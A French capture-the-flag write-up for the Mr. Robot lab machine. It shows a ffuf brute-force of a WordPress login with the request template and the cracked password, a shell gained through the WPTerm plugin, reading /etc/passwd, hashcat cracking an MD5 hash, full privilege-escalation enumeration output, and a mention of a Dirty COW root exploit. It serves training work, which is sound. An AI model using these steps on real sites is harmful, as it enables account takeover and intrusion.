---
title: Mr Robot
weight: 1
---

# Mr Robot

![Screenshot de l'application](../img/mrrobot_illu.png)

## Reconnaissance

La machine Mr. Robot est disponible sur plusieurs plateforme (Vulnhub, TryHackMe Root me...) . Cette machine nous demande de récupérer 3 drapeaux.  

## Acces a l'application 

On accede à l'application depuis le port HTTP. A partir de là l'application se présente comme un terminal. quelques options sont disponible mais l'application nous montre majoritairement des videos et du texte. 

En utilisant gobuster on s'aperçoit également que l'application est en fait un site wordpress. 

### robots.txt 

en fouillant un petit peu on trouve rapidement le robots.txt qui contient notre premier drapeau mais également un dictionnaire .dic.

### Fuzzing & Bruteforce 


Sur notre site wordpress, on utilise la fonctionnalité "Mot de passe oublié" pour essayer de trouver un utilisateur existant. En se servant des noms des personnages de la série on trouve que "Elliot" est utilisateur. 

On lance alors ffuf et on trouve le mot de passe.  



```bash
ffuf -request login.txt -w uniquedic.dic -t 200 -o fuzzResult  -fl 59
```

```http
POST /wp-login.php HTTP/1.1
Host: ctf04.root-me.org
Content-Length: 106
Referer: http://ctf04.root-me.org/wp-login.php
Accept-Encoding: gzip, deflate, br
Cookie: xxxxx
Connection: keep-alive

log=Elliot&pwd=FUZZ&wp-submit=Log+In&redirect_to=http%3A%2F%2Fctf04.root-me.org%2Fwp-admin%2F&testcookie=1%
```

![fuzzing](../img/mrrobot_fuzzing.png)

On obtient le mot de passe : "ER28-0652".

## Shell 
### Wordpress Plugin 

Il se trouve qu'Elliot est administrateur du site wordpress. On va donc installer un plugin qui nous permettra d'executer des commandes sur la machine. On installe donc le plugin WPTerm. Après ça on peut récupérer un terminal et lister les utilisateurs via le fichier /etc/passwd

![passwd](../img/mrrobot_passwd.png)

### Utilisateur robot

Une fois sur le terminal, on liste les utilisateurs en vérifiant le fichier /etc/passwd. On s'aperçoit qu'il y a un utilisateur robot. Cet utilisateur a un fichier password.raw-md5 dans son dossier utilisateur. 

### Hashcat 

On utilise hashcat pour essayer de trouver le mot de passe correspondant : 

```bash
hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt
```

![passwd](../img/mrrobot_hashcat.png)

on trouve le mot de passe "abcdefghijklmnopqstruvwxyz". dans robot on trouve egalement notre deuxième drapeau. 

## Escalade de privilege 

Après une énumération manuelle on voit qu'il n'y pas moyen d'exploiter de failles de sudo ni d'exploiter les fichiers de l'utilisateur. On passe à une énumération automatisée.

### Enumeration avec LES 

{{% details "Enumeration LES" %}}

```bash
 ./lse.sh
---
If you know the current user password, write it here to check sudo privileges: abcdefghijklmnopqrstuvwxyz
---

 LSE Version: 4.14nw

        User: robot
     User ID: 1002
    Password: ******
        Home: /home/robot
        Path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
       umask: 0002

    Hostname: linux
       Linux: 3.13.0-55-generic
Distribution: Ubuntu 14.04.2 LTS
Architecture: x86_64

=====================( Current Output Verbosity Level: 0 )======================
===============================================================( humanity )=====
[!] nowar0 Should we question autocrats and their "military operations"?... yes!
---
                                      NO
                                      WAR
---
==================================================================( users )=====
[i] usr000 Current user groups............................................. yes!
[*] usr010 Is current user in an administrative group?..................... nope
[*] usr020 Are there other users in administrative groups?................. yes!
[*] usr030 Other users with shell.......................................... yes!
[i] usr040 Environment information......................................... skip
[i] usr050 Groups for other users.......................................... skip
[i] usr060 Other users..................................................... skip
[*] usr070 PATH variables defined inside /etc.............................. yes!
[!] usr080 Is '.' in a PATH variable defined inside /etc?.................. nope
===================================================================( sudo )=====
[!] sud000 Can we sudo without a password?................................. nope
[!] sud010 Can we list sudo commands without a password?................... nope
[!] sud020 Can we sudo with a password?.................................... nope
[!] sud030 Can we list sudo commands with a password?...................... nope
[*] sud040 Can we read sudoers files?...................................... nope
[*] sud050 Do we know if any other users used sudo?........................ nope
============================================================( file system )=====
[*] fst000 Writable files outside user's home.............................. yes!
[*] fst010 Binaries with setuid bit........................................ yes!
[!] fst020 Uncommon setuid binaries........................................ yes!
---
/usr/local/bin/nmap
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
---
[!] fst030 Can we write to any setuid binary?.............................. nope
[*] fst040 Binaries with setgid bit........................................ skip
[!] fst050 Uncommon setgid binaries........................................ skip
[!] fst060 Can we write to any setgid binary?.............................. skip
[*] fst070 Can we read /root?.............................................. nope
[*] fst080 Can we read subdirectories under /home?......................... nope
[*] fst090 SSH files in home directories................................... nope
[*] fst100 Useful binaries................................................. yes!
[*] fst110 Other interesting files in home directories..................... nope
[!] fst120 Are there any credentials in fstab/mtab?........................ nope
[*] fst130 Does 'robot' have mail?......................................... nope
[!] fst140 Can we access other users mail?................................. nope
[*] fst150 Looking for GIT/SVN repositories................................ yes!
[!] fst160 Can we write to critical files?................................. nope
[!] fst170 Can we write to critical directories?........................... nope
[!] fst180 Can we write to directories from PATH defined in /etc?.......... nope
[!] fst190 Can we read any backup?......................................... nope
[!] fst200 Are there possible credentials in any shell history file?....... nope
[!] fst210 Are there NFS exports with 'no_root_squash' option?............. nope
[*] fst220 Are there NFS exports with 'no_all_squash' option?.............. nope
[i] fst500 Files owned by user 'robot'..................................... skip
[i] fst510 SSH files anywhere.............................................. skip
[i] fst520 Check hosts.equiv file and its contents......................... skip
[i] fst530 List NFS server shares.......................................... skip
[i] fst540 Dump fstab file................................................. skip
=================================================================( system )=====
[i] sys000 Who is logged in................................................ skip
[i] sys010 Last logged in users............................................ skip
[!] sys020 Does the /etc/passwd have hashes?............................... nope
[!] sys022 Does the /etc/group have hashes?................................ nope
[!] sys030 Can we read shadow files?....................................... nope
[*] sys040 Check for other superuser accounts.............................. nope
[*] sys050 Can root user log in via SSH?................................... yes!
[i] sys060 List available shells........................................... skip
[i] sys070 System umask in /etc/login.defs................................. skip
[i] sys080 System password policies in /etc/login.defs..................... skip
===============================================================( security )=====
[*] sec000 Is SELinux present?............................................. nope
[*] sec010 List files with capabilities.................................... nope
[!] sec020 Can we write to a binary with caps?............................. nope
[!] sec030 Do we have all caps in any binary?.............................. nope
[*] sec040 Users with associated capabilities.............................. nope
[!] sec050 Does current user have capabilities?............................ skip
[!] sec060 Can we read the auditd log?..................................... nope
========================================================( recurrent tasks )=====
[*] ret000 User crontab.................................................... nope
[!] ret010 Cron tasks writable by user..................................... nope
[*] ret020 Cron jobs....................................................... yes!
[*] ret030 Can we read user crontabs....................................... nope
[*] ret040 Can we list other user cron tasks?.............................. nope
[*] ret050 Can we write to any paths present in cron jobs.................. nope
[!] ret060 Can we write to executable paths present in cron jobs........... skip
[i] ret400 Cron files...................................................... skip
[*] ret500 User systemd timers............................................. nope
[!] ret510 Can we write in any system timer?............................... nope
[i] ret900 Systemd timers.................................................. skip
================================================================( network )=====
[*] net000 Services listening only on localhost............................ yes!
[!] net010 Can we sniff traffic with tcpdump?.............................. nope
[i] net500 NIC and IP information.......................................... skip
[i] net510 Routing table................................................... skip
[i] net520 ARP table....................................................... skip
[i] net530 Nameservers..................................................... skip
[i] net540 Systemd Nameservers............................................. skip
[i] net550 Listening TCP................................................... skip
[i] net560 Listening UDP................................................... skip
===============================================================( services )=====
[!] srv000 Can we write in service files?.................................. nope
[!] srv010 Can we write in binaries executed by services?.................. nope
[*] srv020 Files in /etc/init.d/ not belonging to root..................... nope
[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope
[*] srv040 Upstart files not belonging to root............................. nope
[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope
[i] srv400 Contents of /etc/inetd.conf..................................... skip
[i] srv410 Contents of /etc/xinetd.conf.................................... skip
[i] srv420 List /etc/xinetd.d if used...................................... skip
[i] srv430 List /etc/init.d/ permissions................................... skip
[i] srv440 List /etc/rc.d/init.d permissions............................... skip
[i] srv450 List /usr/local/etc/rc.d permissions............................ skip
[i] srv460 List /etc/init/ permissions..................................... skip
[!] srv500 Can we write in systemd service files?.......................... nope
[!] srv510 Can we write in binaries executed by systemd services?.......... nope
[*] srv520 Systemd files not belonging to root............................. nope
[i] srv900 Systemd config files permissions................................ skip
===============================================================( software )=====
[!] sof000 Can we connect to MySQL with root/root credentials?............. nope
[!] sof010 Can we connect to MySQL as root without password?............... nope
[!] sof015 Are there credentials in mysql_history file?.................... nope
[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope
[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope
[*] sof030 Installed apache modules........................................ nope
[!] sof040 Found any .htpasswd files?...................................... nope
[!] sof050 Are there private keys in ssh-agent?............................ nope
[!] sof060 Are there gpg keys cached in gpg-agent?......................... nope
[!] sof070 Can we write to a ssh-agent socket?............................. nope
[!] sof080 Can we write to a gpg-agent socket?............................. nope
[!] sof090 Found any keepass database files?............................... nope
[!] sof100 Found any 'pass' store directories?............................. nope
[!] sof110 Are there any tmux sessions available?.......................... nope
[*] sof120 Are there any tmux sessions from other users?................... nope
[!] sof130 Can we write to tmux session sockets from other users?.......... nope
[!] sof140 Are any screen sessions available?.............................. nope
[*] sof150 Are there any screen sessions from other users?................. nope
[!] sof160 Can we write to screen session sockets from other users?........ nope
[*] sof170 Can we access MongoDB databases without credentials?............ nope
[!] sof180 Can we access any Kerberos credentials?......................... nope
[i] sof500 Sudo version.................................................... skip
[i] sof510 MySQL version................................................... skip
[i] sof520 Postgres version................................................ skip
[i] sof530 Apache version.................................................. skip
[i] sof540 Tmux version.................................................... skip
[i] sof550 Screen version.................................................. skip
=============================================================( containers )=====
[*] ctn000 Are we in a docker container?................................... nope
[*] ctn010 Is docker available?............................................ nope
[!] ctn020 Is the user a member of the 'docker' group?..................... nope
[*] ctn200 Are we in a lxc container?...................................... nope
[!] ctn210 Is the user a member of any lxc/lxd group?...................... nope
==============================================================( processes )=====
[i] pro000 Waiting for the process monitor to finish....................... yes!
[i] pro001 Retrieving process binaries..................................... yes!
[i] pro002 Retrieving process users........................................ yes!
[!] pro010 Can we write in any process binary?............................. nope
[*] pro020 Processes running with root permissions......................... yes!
[*] pro030 Processes running by non-root users with shell.................. nope
[i] pro500 Running processes............................................... skip
[i] pro510 Running process binaries and permissions........................ skip
===================================================================( CVEs )=====
[!] cve-2019-5736 Escalate in some types of docker containers.............. nope
[!] cve-2021-3156 Sudo Baron Samedit vulnerability......................... yes!
---
Vulnerable! sudo version: 1.8.9p5-1ubuntu1.1
---
[!] cve-2021-3560 Checking for policykit vulnerability..................... nope
[!] cve-2021-4034 Checking for PwnKit vulnerability........................ nope
[!] cve-2022-0847 Dirty Pipe vulnerability................................. nope
[!] cve-2022-25636 Netfilter linux kernel vulnerability.................... nope
[!] cve-2023-22809 Sudoedit bypass in Sudo <= 1.9.12p1..................... yes!
---
Vulnerable! sudo version: 1.8.9p5-1ubuntu1.1
---

==================================( FINISHED )==================================
```

{{% /details %}}

### Dirtycow

L'énumération nous montre une faille possible avec dirtycow. On exploite directement la faille et on obtient un shell root pour notre dernier drapeau. 

![root](../img/mrrobot_root.png)